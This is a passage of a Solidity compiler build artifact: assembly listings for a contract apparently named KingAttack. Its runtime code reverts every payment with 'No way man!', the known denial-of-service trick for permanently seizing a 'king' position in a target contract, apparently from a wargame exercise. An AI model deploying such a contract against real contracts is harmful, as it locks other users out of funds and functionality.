									"end": 210,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "3F"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "RETURNDATACOPY",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "tag",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "tag",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "30"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "30"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "32"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "32"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "34"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "35"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "35"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "34"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "36"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "36"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "tag",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1303,
									"end": 1314,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1340,
									"end": 1343,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1325,
									"end": 1343,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1325,
									"end": 1343,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1202,
									"end": 1349,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1355,
									"end": 1469,
									"name": "tag",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 1355,
									"end": 1469,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1355,
									"end": 1469,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1355,
									"end": 1469,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1475,
									"end": 1873,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 1475,
									"end": 1873,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1634,
									"end": 1637,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1655,
									"end": 1738,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 1736,
									"end": 1737,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1731,
									"end": 1734,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1655,
									"end": 1738,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 1655,
									"end": 1738,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1655,
									"end": 1738,
									"name": "tag",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 1655,
									"end": 1738,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1648,
									"end": 1738,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1648,
									"end": 1738,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1747,
									"end": 1840,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "41"
								},
								{
									"begin": 1836,
									"end": 1839,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1747,
									"end": 1840,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 1747,
									"end": 1840,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1747,
									"end": 1840,
									"name": "tag",
									"source": 1,
									"value": "41"
								},
								{
									"begin": 1747,
									"end": 1840,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1865,
									"end": 1866,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1860,
									"end": 1863,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1856,
									"end": 1867,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1849,
									"end": 1867,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1849,
									"end": 1867,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1475,
									"end": 1873,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1475,
									"end": 1873,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1475,
									"end": 1873,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1475,
									"end": 1873,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1879,
									"end": 2258,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 1879,
									"end": 2258,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2063,
									"end": 2066,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 2085,
									"end": 2232,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "43"
								},
								{
									"begin": 2228,
									"end": 2231,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2085,
									"end": 2232,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 2085,
									"end": 2232,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2085,
									"end": 2232,
									"name": "tag",
									"source": 1,
									"value": "43"
								},
								{
									"begin": 2085,
									"end": 2232,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2078,
									"end": 2232,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2078,
									"end": 2232,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2249,
									"end": 2252,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 2242,
									"end": 2252,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 2242,
									"end": 2252,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1879,
									"end": 2258,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1879,
									"end": 2258,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1879,
									"end": 2258,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1879,
									"end": 2258,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 60,
									"end": 297,
									"name": "tag",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200d14ef600b13c07c30498ef510ccb41fb52d2c08ed82e7ff6fe09dbcce71e0ec64736f6c634300080f0033",
									".code": [
										{
											"begin": 60,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 297,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 265,
											"end": 286,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 265,
											"end": 286,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 265,
											"end": 286,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 7,
											"end": 176,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 7,
											"end": 176,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 91,
											"end": 102,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 125,
											"end": 131,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 120,
											"end": 123,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 113,
											"end": 132,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 165,
											"end": 169,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 160,
											"end": 163,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 156,
											"end": 170,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 141,
											"end": 170,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 141,
											"end": 170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 176,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 182,
											"end": 343,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 182,
											"end": 343,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 322,
											"end": 335,
											"name": "PUSH",
											"source": 1,
											"value": "4E6F20776179206D616E21000000000000000000000000000000000000000000"
										},
										{
											"begin": 318,
											"end": 319,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 310,
											"end": 316,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 306,
											"end": 320,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 299,
											"end": 336,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 182,
											"end": 343,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 182,
											"end": 343,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 349,
											"end": 715,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 349,
											"end": 715,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 491,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 512,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 576,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "B"
										},
										{
											"begin": 571,
											"end": 574,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 512,
											"end": 579,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 512,
											"end": 579,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 512,
											"end": 579,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 512,
											"end": 579,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 505,
											"end": 579,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 505,
											"end": 579,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 588,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 677,
											"end": 680,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 588,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 588,
											"end": 681,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 588,
											"end": 681,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 588,
											"end": 681,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 706,
											"end": 708,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 701,
											"end": 704,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 697,
											"end": 709,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 690,
											"end": 709,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 690,
											"end": 709,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 349,
											"end": 715,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 349,
											"end": 715,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 349,
											"end": 715,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 349,
											"end": 715,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 721,
											"end": 1140,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 721,
											"end": 1140,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 887,
											"end": 891,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 925,
											"end": 927,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 914,
											"end": 923,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 910,
											"end": 928,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 902,
											"end": 928,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 902,
											"end": 928,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 974,
											"end": 983,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 968,
											"end": 972,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 964,
											"end": 984,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 960,
											"end": 961,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 949,
											"end": 958,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 945,
											"end": 962,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 938,
											"end": 985,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1002,
											"end": 1133,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1128,
											"end": 1132,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1002,
											"end": 1133,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1002,
											"end": 1133,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1002,
											"end": 1133,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1002,
											"end": 1133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 994,
											"end": 1133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 994,
											"end": 1133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 721,
											"end": 1140,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 721,
											"end": 1140,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 721,
											"end": 1140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 721,
											"end": 1140,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/KingAttack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
